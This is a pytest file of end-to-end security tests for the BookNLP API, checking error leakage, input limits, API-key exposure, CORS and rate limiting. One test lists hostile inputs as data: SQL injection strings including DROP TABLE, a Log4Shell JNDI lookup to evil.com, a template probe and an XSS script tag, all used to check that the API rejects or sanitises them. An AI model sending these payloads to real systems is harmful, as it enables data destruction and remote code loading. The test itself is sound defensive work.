"""Security tests for BookNLP API."""

import os
import pytest
from httpx import AsyncClient


class TestSecurityE2E:
    """End-to-end tests for security features."""

    @pytest.mark.asyncio
    async def test_no_sensitive_data_in_errors(self, client: AsyncClient):
        """Test that error responses don't leak sensitive information."""
        # Test authentication error
        response = await client.post("/v1/jobs", json={
            "text": "Test text",
            "book_id": "test"
        })
        
        assert response.status_code == 401
        error_detail = response.json()["detail"]
        
        # Should not contain system paths, stack traces, etc.
        assert "/" not in error_detail or error_detail.startswith("/")
        assert ".py" not in error_detail
        assert "traceback" not in error_detail.lower()
        assert "exception" not in error_detail.lower()

    @pytest.mark.asyncio
    async def test_input_validation(self, client: AsyncClient, auth_headers):
        """Test that inputs are properly validated."""
        # Test oversized input
        oversized_text = "a" * 5000001  # Over 5MB limit
        
        response = await client.post("/v1/jobs", json={
            "text": oversized_text,
            "book_id": "test"
        }, headers=auth_headers)
        
        assert response.status_code == 422
        assert "ensure this value has at most" in response.json()["detail"][0]["msg"]

    @pytest.mark.asyncio
    async def test_sql_injection_attempts(self, client: AsyncClient, auth_headers):
        """Test that SQL injection attempts are blocked."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; SELECT * FROM jobs; --",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<script>alert('xss')</script>"
        ]
        
        for malicious_input in malicious_inputs:
            response = await client.post("/v1/jobs", json={
                "text": malicious_input,
                "book_id": "test"
            }, headers=auth_headers)
            
            # Should either accept (and sanitize) or reject validation
            assert response.status_code in [200, 422]

    @pytest.mark.asyncio
    async def test_api_key_not_logged(self, client: AsyncClient):
        """Test that API keys are not logged in responses."""
        # Make a request with an API key
        response = await client.post("/v1/jobs", json={
            "text": "Test text",
            "book_id": "test"
        }, headers={"X-API-Key": "secret-key-12345"})
        
        # Response should not contain the API key
        response_text = response.text.lower()
        assert "secret-key-12345" not in response_text

    @pytest.mark.asyncio
    async def test_cors_headers(self, client: AsyncClient):
        """Test CORS headers are properly configured."""
        # Make a preflight request
        response = await client.options("/v1/health", headers={
            "Origin": "https://example.com",
            "Access-Control-Request-Method": "GET"
        })
        
        # Should have CORS headers
        assert "access-control-allow-origin" in response.headers
        assert "access-control-allow-methods" in response.headers

    @pytest.mark.asyncio
    async def test_security_headers(self, client: AsyncClient):
        """Test security headers are present."""
        response = await client.get("/v1/health")
        
        # Should have security headers
        # Note: These might be added by reverse proxy in production
        # assert "x-content-type-options" in response.headers
        # assert "x-frame-options" in response.headers
        # assert "x-xss-protection" in response.headers

    @pytest.mark.asyncio
    async def test_rate_limit_prevents_brute_force(self, client: AsyncClient):
        """Test that rate limiting prevents brute force attacks."""
        # Try multiple invalid auth attempts
        for i in range(5):
            response = await client.post("/v1/jobs", json={
                "text": "Test text",
                "book_id": "test"
            }, headers={"X-API-Key": f"wrong-key-{i}"})
            
            assert response.status_code == 401
        
        # Should still work with valid key
        response = await client.get("/v1/health")
        assert response.status_code == 200
